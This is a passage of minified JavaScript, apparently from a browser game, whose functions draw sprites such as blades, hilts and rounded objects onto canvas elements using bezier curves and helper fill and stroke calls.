                return n.width = 321 * e,
                    n.height = 284 * e,
                    r.translate(100 * e, 30 * e),
                    r.translate(5 * e, 10 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(58 * e, 33 * e),
                    r.bezierCurveTo(81 * e, 22 * e, 93 * e, 26 * e, 123 * e, 47 * e),
                    r.bezierCurveTo(160 * e, 73 * e, 169 * e, 80 * e, 191 * e, 99 * e),
                    r.bezierCurveTo(202 * e, 107 * e, 211 * e, 118 * e, 195 * e, 151 * e),
                    r.bezierCurveTo(181 * e, 183 * e, 157 * e, 192 * e, 129 * e, 174 * e),
                    r.bezierCurveTo(78 * e, 140 * e, 68 * e, 129 * e, 37 * e, 94 * e),
                    r.bezierCurveTo(15 * e, 68 * e, 25 * e, 52 * e, 56 * e, 34 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(58 * e, 33 * e),
                    r.bezierCurveTo(81 * e, 22 * e, 93 * e, 26 * e, 123 * e, 47 * e),
                    r.bezierCurveTo(160 * e, 73 * e, 169 * e, 80 * e, 191 * e, 99 * e),
                    r.bezierCurveTo(202 * e, 107 * e, 211 * e, 118 * e, 195 * e, 151 * e),
                    r.bezierCurveTo(181 * e, 183 * e, 157 * e, 192 * e, 129 * e, 174 * e),
                    r.bezierCurveTo(78 * e, 140 * e, 68 * e, 129 * e, 37 * e, 94 * e),
                    r.bezierCurveTo(15 * e, 68 * e, 25 * e, 52 * e, 56 * e, 34 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(167 * e, 120 * e),
                    r.bezierCurveTo(196 * e, 106 * e, 207 * e, 111 * e, 199 * e, 135 * e),
                    r.bezierCurveTo(185 * e, 172 * e, 166 * e, 187 * e, 145 * e, 179 * e),
                    r.bezierCurveTo(118 * e, 166 * e, 127 * e, 139 * e, 166 * e, 121 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(25 * e, 64 * e),
                    r.bezierCurveTo(59 * e, 96 * e, 97 * e, 128 * e, 129 * e, 151 * e),
                    r.bezierCurveTo(126 * e, 163 * e, 134 * e, 174 * e, 142 * e, 180 * e),
                    r.bezierCurveTo(114 * e, 170 * e, 68 * e, 134 * e, 31 * e, 85 * e),
                    r.bezierCurveTo(24 * e, 71 * e, 24 * e, 70 * e, 25 * e, 65 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(161 * e, 141 * e),
                    r.bezierCurveTo(181 * e, 131 * e, 186 * e, 135 * e, 173 * e, 152 * e),
                    r.bezierCurveTo(163 * e, 163 * e, 155 * e, 161 * e, 151 * e, 150 * e),
                    r.bezierCurveTo(147 * e, 140 * e, 155 * e, 131 * e, 175 * e, 125 * e),
                    r.bezierCurveTo(190 * e, 120 * e, 196 * e, 121 * e, 189 * e, 143 * e),
                    r.bezierCurveTo(182 * e, 167 * e, 169 * e, 174 * e, 157 * e, 174 * e),
                    r.bezierCurveTo(138 * e, 172 * e, 139 * e, 162 * e, 140 * e, 156 * e),
                    he(r, void 0, i[4], 4 * e),
                    r.translate(-100 * e, -30 * e),
                    r.translate(10 * e, 70 * e),
                    r.translate(5 * e, 10 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(58 * e, 33 * e),
                    r.bezierCurveTo(81 * e, 22 * e, 93 * e, 26 * e, 123 * e, 47 * e),
                    r.bezierCurveTo(160 * e, 73 * e, 169 * e, 80 * e, 191 * e, 99 * e),
                    r.bezierCurveTo(202 * e, 107 * e, 211 * e, 118 * e, 195 * e, 151 * e),
                    r.bezierCurveTo(181 * e, 183 * e, 157 * e, 192 * e, 129 * e, 174 * e),
                    r.bezierCurveTo(78 * e, 140 * e, 68 * e, 129 * e, 37 * e, 94 * e),
                    r.bezierCurveTo(15 * e, 68 * e, 25 * e, 52 * e, 56 * e, 34 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(58 * e, 33 * e),
                    r.bezierCurveTo(81 * e, 22 * e, 93 * e, 26 * e, 123 * e, 47 * e),
                    r.bezierCurveTo(160 * e, 73 * e, 169 * e, 80 * e, 191 * e, 99 * e),
                    r.bezierCurveTo(202 * e, 107 * e, 211 * e, 118 * e, 195 * e, 151 * e),
                    r.bezierCurveTo(181 * e, 183 * e, 157 * e, 192 * e, 129 * e, 174 * e),
                    r.bezierCurveTo(78 * e, 140 * e, 68 * e, 129 * e, 37 * e, 94 * e),
                    r.bezierCurveTo(15 * e, 68 * e, 25 * e, 52 * e, 56 * e, 34 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(167 * e, 120 * e),
                    r.bezierCurveTo(196 * e, 106 * e, 207 * e, 111 * e, 199 * e, 135 * e),
                    r.bezierCurveTo(185 * e, 172 * e, 166 * e, 187 * e, 145 * e, 179 * e),
                    r.bezierCurveTo(118 * e, 166 * e, 127 * e, 139 * e, 166 * e, 121 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(25 * e, 64 * e),
                    r.bezierCurveTo(59 * e, 96 * e, 97 * e, 128 * e, 129 * e, 151 * e),
                    r.bezierCurveTo(126 * e, 163 * e, 134 * e, 174 * e, 142 * e, 180 * e),
                    r.bezierCurveTo(114 * e, 170 * e, 68 * e, 134 * e, 31 * e, 85 * e),
                    r.bezierCurveTo(24 * e, 71 * e, 24 * e, 70 * e, 25 * e, 65 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(161 * e, 141 * e),
                    r.bezierCurveTo(181 * e, 131 * e, 186 * e, 135 * e, 173 * e, 152 * e),
                    r.bezierCurveTo(163 * e, 163 * e, 155 * e, 161 * e, 151 * e, 150 * e),
                    r.bezierCurveTo(147 * e, 140 * e, 155 * e, 131 * e, 175 * e, 125 * e),
                    r.bezierCurveTo(190 * e, 120 * e, 196 * e, 121 * e, 189 * e, 143 * e),
                    r.bezierCurveTo(182 * e, 167 * e, 169 * e, 174 * e, 157 * e, 174 * e),
                    r.bezierCurveTo(138 * e, 172 * e, 139 * e, 162 * e, 140 * e, 156 * e),
                    he(r, void 0, i[4], 4 * e),
                    r.translate(20 * e, -80 * e),
                    r.translate(5 * e, 10 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(58 * e, 33 * e),
                    r.bezierCurveTo(81 * e, 22 * e, 93 * e, 26 * e, 123 * e, 47 * e),
                    r.bezierCurveTo(160 * e, 73 * e, 169 * e, 80 * e, 191 * e, 99 * e),
                    r.bezierCurveTo(202 * e, 107 * e, 211 * e, 118 * e, 195 * e, 151 * e),
                    r.bezierCurveTo(181 * e, 183 * e, 157 * e, 192 * e, 129 * e, 174 * e),
                    r.bezierCurveTo(78 * e, 140 * e, 68 * e, 129 * e, 37 * e, 94 * e),
                    r.bezierCurveTo(15 * e, 68 * e, 25 * e, 52 * e, 56 * e, 34 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(58 * e, 33 * e),
                    r.bezierCurveTo(81 * e, 22 * e, 93 * e, 26 * e, 123 * e, 47 * e),
                    r.bezierCurveTo(160 * e, 73 * e, 169 * e, 80 * e, 191 * e, 99 * e),
                    r.bezierCurveTo(202 * e, 107 * e, 211 * e, 118 * e, 195 * e, 151 * e),
                    r.bezierCurveTo(181 * e, 183 * e, 157 * e, 192 * e, 129 * e, 174 * e),
                    r.bezierCurveTo(78 * e, 140 * e, 68 * e, 129 * e, 37 * e, 94 * e),
                    r.bezierCurveTo(15 * e, 68 * e, 25 * e, 52 * e, 56 * e, 34 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(167 * e, 120 * e),
                    r.bezierCurveTo(196 * e, 106 * e, 207 * e, 111 * e, 199 * e, 135 * e),
                    r.bezierCurveTo(185 * e, 172 * e, 166 * e, 187 * e, 145 * e, 179 * e),
                    r.bezierCurveTo(118 * e, 166 * e, 127 * e, 139 * e, 166 * e, 121 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(25 * e, 64 * e),
                    r.bezierCurveTo(59 * e, 96 * e, 97 * e, 128 * e, 129 * e, 151 * e),
                    r.bezierCurveTo(126 * e, 163 * e, 134 * e, 174 * e, 142 * e, 180 * e),
                    r.bezierCurveTo(114 * e, 170 * e, 68 * e, 134 * e, 31 * e, 85 * e),
                    r.bezierCurveTo(24 * e, 71 * e, 24 * e, 70 * e, 25 * e, 65 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(161 * e, 141 * e),
                    r.bezierCurveTo(181 * e, 131 * e, 186 * e, 135 * e, 173 * e, 152 * e),
                    r.bezierCurveTo(163 * e, 163 * e, 155 * e, 161 * e, 151 * e, 150 * e),
                    r.bezierCurveTo(147 * e, 140 * e, 155 * e, 131 * e, 175 * e, 125 * e),
                    r.bezierCurveTo(190 * e, 120 * e, 196 * e, 121 * e, 189 * e, 143 * e),
                    r.bezierCurveTo(182 * e, 167 * e, 169 * e, 174 * e, 157 * e, 174 * e),
                    r.bezierCurveTo(138 * e, 172 * e, 139 * e, 162 * e, 140 * e, 156 * e),
                    he(r, void 0, i[4], 4 * e),
                    n
            }
            function rt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 290 * e,
                    n.height = 525 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(20 * e, 20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(111 * e, 351 * e),
                    r.bezierCurveTo(128.5 * e, 218.5 * e, 128.5 * e, 218.5 * e, 146 * e, 86 * e),
                    r.bezierCurveTo(166.5 * e, 66.5 * e, 166.5 * e, 66.5 * e, 187 * e, 47 * e),
                    r.bezierCurveTo(201 * e, 71.5 * e, 201 * e, 71.5 * e, 215 * e, 96 * e),
                    r.bezierCurveTo(193 * e, 228.5 * e, 193 * e, 228.5 * e, 171 * e, 361 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(129.5 * e, 424 * e),
                    r.rotate(.16),
                    Ve(r, -15.5 * e, -63 * e, 31 * e, 126 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    ke(r, 121 * e, 480 * e, 20.396078054371138 * e),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(90 * e, 311 * e),
                    r.bezierCurveTo(95 * e, 324 * e, 95 * e, 324 * e, 100 * e, 337 * e),
                    r.bezierCurveTo(141.5 * e, 345.5 * e, 141.5 * e, 345.5 * e, 183 * e, 354 * e),
                    r.bezierCurveTo(193.5 * e, 342.5 * e, 193.5 * e, 342.5 * e, 204 * e, 331 * e),
                    r.bezierCurveTo(202 * e, 354 * e, 202 * e, 354 * e, 200 * e, 377 * e),
                    r.bezierCurveTo(147 * e, 388 * e, 106 * e, 371 * e, 79 * e, 356 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-20 * e, -20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(111 * e, 351 * e),
                    r.bezierCurveTo(128.5 * e, 218.5 * e, 128.5 * e, 218.5 * e, 146 * e, 86 * e),
                    r.bezierCurveTo(166.5 * e, 66.5 * e, 166.5 * e, 66.5 * e, 187 * e, 47 * e),
                    r.bezierCurveTo(201 * e, 71.5 * e, 201 * e, 71.5 * e, 215 * e, 96 * e),
                    r.bezierCurveTo(193 * e, 228.5 * e, 193 * e, 228.5 * e, 171 * e, 361 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 12.5 * e),
                    r.save(),
                    r.translate(129.5 * e, 424 * e),
                    r.rotate(.16),
                    Ve(r, -15.5 * e, -63 * e, 31 * e, 126 * e, 10 * e),
                    r.restore(),
                    he(r, i[4], i[5], 12.5 * e),
                    ke(r, 121 * e, 480 * e, 20.396078054371138 * e),
                    he(r, i[4], i[5], 12.5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(90 * e, 311 * e),
                    r.bezierCurveTo(95 * e, 324 * e, 95 * e, 324 * e, 100 * e, 337 * e),
                    r.bezierCurveTo(141.5 * e, 345.5 * e, 141.5 * e, 345.5 * e, 183 * e, 354 * e),
                    r.bezierCurveTo(193.5 * e, 342.5 * e, 193.5 * e, 342.5 * e, 204 * e, 331 * e),
                    r.bezierCurveTo(202 * e, 354 * e, 202 * e, 354 * e, 200 * e, 377 * e),
                    r.bezierCurveTo(147 * e, 388 * e, 106 * e, 371 * e, 79 * e, 356 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 12.5 * e),
                    n
            }
            function ot(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 290 * e,
                    n.height = 525 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(20 * e, 20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(112 * e, 356 * e),
                    r.bezierCurveTo(124 * e, 220.5 * e, 124 * e, 220.5 * e, 136 * e, 85 * e),
                    r.bezierCurveTo(162.5 * e, 65.5 * e, 162.5 * e, 65.5 * e, 189 * e, 46 * e),
                    r.bezierCurveTo(208.5 * e, 72.5 * e, 208.5 * e, 72.5 * e, 228 * e, 99 * e),
                    r.bezierCurveTo(200 * e, 232 * e, 200 * e, 232 * e, 172 * e, 365 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(131 * e, 423 * e),
                    r.rotate(.16),
                    Ve(r, -14 * e, -53 * e, 28 * e, 106 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(122 * e, 480 * e),
                    r.rotate(1.72),
                    A(r, 4, 26.476404589747453 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(210 * e, 387 * e),
                    r.bezierCurveTo(138 * e, 376 * e, 138 * e, 376 * e, 66 * e, 365 * e),
                    r.bezierCurveTo(76 * e, 355 * e, 76 * e, 355 * e, 86 * e, 345 * e),
                    r.bezierCurveTo(99 * e, 346.5 * e, 99 * e, 346.5 * e, 112 * e, 348 * e),
                    r.bezierCurveTo(128.5 * e, 344 * e, 128.5 * e, 344 * e, 145 * e, 340 * e),
                    r.bezierCurveTo(158 * e, 348 * e, 158 * e, 348 * e, 171 * e, 356 * e),
                    r.bezierCurveTo(184 * e, 358 * e, 184 * e, 358 * e, 197 * e, 360 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(129 * e, 338 * e),
                    r.bezierCurveTo(137 * e, 336 * e, 137 * e, 336 * e, 145 * e, 334 * e),
                    r.bezierCurveTo(152.5 * e, 338 * e, 152.5 * e, 338 * e, 160 * e, 342 * e),
                    r.bezierCurveTo(184 * e, 224 * e, 184 * e, 224 * e, 208 * e, 106 * e),
                    r.bezierCurveTo(197 * e, 88 * e, 187 * e, 70 * e, 186 * e, 70 * e),
                    r.bezierCurveTo(169.5 * e, 83 * e, 169.5 * e, 83 * e, 153 * e, 96 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-20 * e, -20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(112 * e, 356 * e),
                    r.bezierCurveTo(124 * e, 220.5 * e, 124 * e, 220.5 * e, 136 * e, 85 * e),
                    r.bezierCurveTo(162.5 * e, 65.5 * e, 162.5 * e, 65.5 * e, 189 * e, 46 * e),
                    r.bezierCurveTo(208.5 * e, 72.5 * e, 208.5 * e, 72.5 * e, 228 * e, 99 * e),
                    r.bezierCurveTo(200 * e, 232 * e, 200 * e, 232 * e, 172 * e, 365 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 12.5 * e),
                    r.save(),
                    r.translate(131 * e, 423 * e),
                    r.rotate(.16),
                    Ve(r, -14 * e, -53 * e, 28 * e, 106 * e, 10 * e),
                    r.restore(),
                    he(r, i[4], i[5], 12.5 * e),
                    r.save(),
                    r.translate(122 * e, 480 * e),
                    r.rotate(1.72),
                    A(r, 4, 26.476404589747453 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 12.5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(210 * e, 387 * e),
                    r.bezierCurveTo(138 * e, 376 * e, 138 * e, 376 * e, 66 * e, 365 * e),
                    r.bezierCurveTo(76 * e, 355 * e, 76 * e, 355 * e, 86 * e, 345 * e),
                    r.bezierCurveTo(99 * e, 346.5 * e, 99 * e, 346.5 * e, 112 * e, 348 * e),
                    r.bezierCurveTo(128.5 * e, 344 * e, 128.5 * e, 344 * e, 145 * e, 340 * e),
                    r.bezierCurveTo(158 * e, 348 * e, 158 * e, 348 * e, 171 * e, 356 * e),
                    r.bezierCurveTo(184 * e, 358 * e, 184 * e, 358 * e, 197 * e, 360 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 12.5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(129 * e, 338 * e),
                    r.bezierCurveTo(137 * e, 336 * e, 137 * e, 336 * e, 145 * e, 334 * e),
                    r.bezierCurveTo(152.5 * e, 338 * e, 152.5 * e, 338 * e, 160 * e, 342 * e),
                    r.bezierCurveTo(184 * e, 224 * e, 184 * e, 224 * e, 208 * e, 106 * e),
                    r.bezierCurveTo(197 * e, 88 * e, 187 * e, 70 * e, 186 * e, 70 * e),
                    r.bezierCurveTo(169.5 * e, 83 * e, 169.5 * e, 83 * e, 153 * e, 96 * e),
                    r.closePath(),
                    he(r, i[3]),
                    n
            }
            function at(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 290 * e,
                    n.height = 525 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(20 * e, 20 * e),
                    r.translate(-20 * e, -20 * e),
                    r.save(),
                    r.translate(132 * e, 423 * e),
                    r.rotate(.16),
                    Ve(r, -14 * e, -61 * e, 28 * e, 122 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(100 * e, 344 * e),
                    r.bezierCurveTo(123 * e, 214 * e, 123 * e, 214 * e, 146 * e, 84 * e),
                    r.bezierCurveTo(166.5 * e, 65 * e, 166.5 * e, 65 * e, 187 * e, 46 * e),
                    r.bezierCurveTo(201 * e, 71 * e, 201 * e, 71 * e, 215 * e, 96 * e),
                    r.bezierCurveTo(199.5 * e, 226.5 * e, 199.5 * e, 226.5 * e, 184 * e, 357 * e),
                    r.bezierCurveTo(162.5 * e, 362.5 * e, 162.5 * e, 362.5 * e, 141 * e, 368 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(75 * e, 328 * e),
                    r.bezierCurveTo(88 * e, 336.5 * e, 88 * e, 336.5 * e, 101 * e, 345 * e),
                    r.bezierCurveTo(123.5 * e, 337.5 * e, 123.5 * e, 337.5 * e, 146 * e, 330 * e),
                    r.bezierCurveTo(165 * e, 343.5 * e, 165 * e, 343.5 * e, 184 * e, 357 * e),
                    r.bezierCurveTo(198.5 * e, 353 * e, 198.5 * e, 353 * e, 213 * e, 349 * e),
                    r.bezierCurveTo(200.5 * e, 364.5 * e, 200.5 * e, 364.5 * e, 188 * e, 380 * e),
                    r.bezierCurveTo(163 * e, 380.5 * e, 163 * e, 380.5 * e, 138 * e, 381 * e),
                    r.bezierCurveTo(112 * e, 373.5 * e, 112 * e, 373.5 * e, 86 * e, 366 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(121 * e, 332 * e),
                    r.bezierCurveTo(133.5 * e, 327.5 * e, 133.5 * e, 327.5 * e, 146 * e, 323 * e),
                    r.bezierCurveTo(157 * e, 330.5 * e, 157 * e, 330.5 * e, 168 * e, 338 * e),
                    r.bezierCurveTo(182.5 * e, 219.5 * e, 182.5 * e, 219.5 * e, 197 * e, 101 * e),
                    r.bezierCurveTo(190 * e, 84.5 * e, 190 * e, 84.5 * e, 183 * e, 68 * e),
                    r.bezierCurveTo(172.5 * e, 81 * e, 172.5 * e, 81 * e, 162 * e, 94 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(105 * e, 463 * e),
                    r.bezierCurveTo(124.5 * e, 466 * e, 124.5 * e, 466 * e, 144 * e, 469 * e),
                    r.bezierCurveTo(145.5 * e, 478.5 * e, 145.5 * e, 478.5 * e, 147 * e, 488 * e),
                    r.bezierCurveTo(133.5 * e, 495.5 * e, 133.5 * e, 495.5 * e, 120 * e, 503 * e),
                    r.bezierCurveTo(108.5 * e, 492 * e, 108.5 * e, 492 * e, 97 * e, 481 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-20 * e, -20 * e),
                    r.save(),
                    r.translate(132 * e, 423 * e),
                    r.rotate(.16),
                    Ve(r, -14 * e, -61 * e, 28 * e, 122 * e, 10 * e),
                    r.restore(),
                    he(r, i[4], i[5], 12.5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(100 * e, 344 * e),
                    r.bezierCurveTo(123 * e, 214 * e, 123 * e, 214 * e, 146 * e, 84 * e),
                    r.bezierCurveTo(166.5 * e, 65 * e, 166.5 * e, 65 * e, 187 * e, 46 * e),
                    r.bezierCurveTo(201 * e, 71 * e, 201 * e, 71 * e, 215 * e, 96 * e),
                    r.bezierCurveTo(199.5 * e, 226.5 * e, 199.5 * e, 226.5 * e, 184 * e, 357 * e),
                    r.bezierCurveTo(162.5 * e, 362.5 * e, 162.5 * e, 362.5 * e, 141 * e, 368 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 12.5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(75 * e, 328 * e),
                    r.bezierCurveTo(88 * e, 336.5 * e, 88 * e, 336.5 * e, 101 * e, 345 * e),
                    r.bezierCurveTo(123.5 * e, 337.5 * e, 123.5 * e, 337.5 * e, 146 * e, 330 * e),
                    r.bezierCurveTo(165 * e, 343.5 * e, 165 * e, 343.5 * e, 184 * e, 357 * e),
                    r.bezierCurveTo(198.5 * e, 353 * e, 198.5 * e, 353 * e, 213 * e, 349 * e),
                    r.bezierCurveTo(200.5 * e, 364.5 * e, 200.5 * e, 364.5 * e, 188 * e, 380 * e),
                    r.bezierCurveTo(163 * e, 380.5 * e, 163 * e, 380.5 * e, 138 * e, 381 * e),
                    r.bezierCurveTo(112 * e, 373.5 * e, 112 * e, 373.5 * e, 86 * e, 366 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 12.5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(121 * e, 332 * e),
                    r.bezierCurveTo(133.5 * e, 327.5 * e, 133.5 * e, 327.5 * e, 146 * e, 323 * e),
                    r.bezierCurveTo(157 * e, 330.5 * e, 157 * e, 330.5 * e, 168 * e, 338 * e),
                    r.bezierCurveTo(182.5 * e, 219.5 * e, 182.5 * e, 219.5 * e, 197 * e, 101 * e),
                    r.bezierCurveTo(190 * e, 84.5 * e, 190 * e, 84.5 * e, 183 * e, 68 * e),
                    r.bezierCurveTo(172.5 * e, 81 * e, 172.5 * e, 81 * e, 162 * e, 94 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(105 * e, 463 * e),
                    r.bezierCurveTo(124.5 * e, 466 * e, 124.5 * e, 466 * e, 144 * e, 469 * e),
                    r.bezierCurveTo(145.5 * e, 478.5 * e, 145.5 * e, 478.5 * e, 147 * e, 488 * e),
                    r.bezierCurveTo(133.5 * e, 495.5 * e, 133.5 * e, 495.5 * e, 120 * e, 503 * e),
                    r.bezierCurveTo(108.5 * e, 492 * e, 108.5 * e, 492 * e, 97 * e, 481 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 12.5 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(143 * e, 346 * e),
                    r.bezierCurveTo(125 * e, 352 * e, 125 * e, 352 * e, 107 * e, 358 * e),
                    r.bezierCurveTo(124 * e, 363 * e, 140 * e, 368 * e, 141 * e, 368 * e),
                    r.bezierCurveTo(156.5 * e, 367 * e, 156.5 * e, 367 * e, 172 * e, 366 * e),
                    r.closePath(),
                    he(r, i[3]),
                    n
            }
            function st(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 154 * e,
                    n.height = 261 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(0, 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(125 * e, 69 * e),
                    r.bezierCurveTo(123.5 * e, 141.5 * e, 123.5 * e, 141.5 * e, 122 * e, 214 * e),
                    r.bezierCurveTo(123 * e, 228 * e, 119 * e, 239 * e, 102 * e, 239 * e),
                    r.bezierCurveTo(90 * e, 238 * e, 86 * e, 225 * e, 89 * e, 197 * e),
                    r.bezierCurveTo(92 * e, 159 * e, 92 * e, 141 * e, 94 * e, 84 * e),
                    r.bezierCurveTo(94 * e, 58 * e, 87 * e, 50 * e, 73 * e, 52 * e),
                    r.bezierCurveTo(53 * e, 54 * e, 54 * e, 92 * e, 34 * e, 87 * e),
                    r.bezierCurveTo(13 * e, 85 * e, 22 * e, 58 * e, 34 * e, 40 * e),
                    r.bezierCurveTo(44 * e, 24 * e, 68 * e, 17 * e, 86 * e, 21 * e),
                    r.bezierCurveTo(111 * e, 23 * e, 123 * e, 39 * e, 125 * e, 67 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(125 * e, 69 * e),
                    r.bezierCurveTo(123.5 * e, 141.5 * e, 123.5 * e, 141.5 * e, 122 * e, 214 * e),
                    r.bezierCurveTo(123 * e, 228 * e, 119 * e, 239 * e, 102 * e, 239 * e),
                    r.bezierCurveTo(90 * e, 238 * e, 86 * e, 225 * e, 89 * e, 197 * e),
                    r.bezierCurveTo(92 * e, 159 * e, 92 * e, 141 * e, 94 * e, 84 * e),
                    r.bezierCurveTo(94 * e, 58 * e, 87 * e, 50 * e, 73 * e, 52 * e),
                    r.bezierCurveTo(53 * e, 54 * e, 54 * e, 92 * e, 34 * e, 87 * e),
                    r.bezierCurveTo(13 * e, 85 * e, 22 * e, 58 * e, 34 * e, 40 * e),
                    r.bezierCurveTo(44 * e, 24 * e, 68 * e, 17 * e, 86 * e, 21 * e),
                    r.bezierCurveTo(111 * e, 23 * e, 123 * e, 39 * e, 125 * e, 67 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(31 * e, 43 * e),
                    r.bezierCurveTo(31 * e, 61 * e, 43 * e, 70 * e, 51 * e, 75 * e),
                    r.bezierCurveTo(48 * e, 84 * e, 41 * e, 89 * e, 33 * e, 86 * e),
                    r.bezierCurveTo(23 * e, 88 * e, 20 * e, 76 * e, 23 * e, 62 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(45 * e, 29 * e),
                    r.bezierCurveTo(49 * e, 45 * e, 61 * e, 54 * e, 64 * e, 55 * e),
                    r.bezierCurveTo(67.5 * e, 53 * e, 67.5 * e, 53 * e, 71 * e, 51 * e),
                    r.bezierCurveTo(80 * e, 44 * e, 83 * e, 33 * e, 82 * e, 20 * e),
                    r.bezierCurveTo(59 * e, 17 * e, 51 * e, 23 * e, 45 * e, 30 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(86 * e, 56 * e),
